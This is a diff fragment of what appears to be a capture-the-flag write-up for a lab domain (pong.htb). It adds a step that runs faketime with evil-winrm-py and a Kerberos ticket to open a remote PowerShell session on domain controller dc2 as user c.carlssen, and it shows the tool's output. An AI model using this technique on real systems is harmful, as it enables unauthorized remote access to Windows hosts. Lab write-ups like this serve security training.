@@ -789,3 +789,17 @@ SMB         dc2.pong.htb    445    dc2              [+] Run the following comman
 
 Ill also grab a TGT for this user
 
+```python
+❯❯❯ faketime -f +8h python3 venv/bin/evil-winrm-py -k -i dc2.pong.htb --no-pass
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
+
+[*] Connecting to 'dc2.pong.htb:5985' as 'c.carlssen@PONG.HTB'
+evil-winrm-py PS C:\Users\C.Carlssen\Documents>
+```
+
+Using this TGT i can get access over WINRM
+
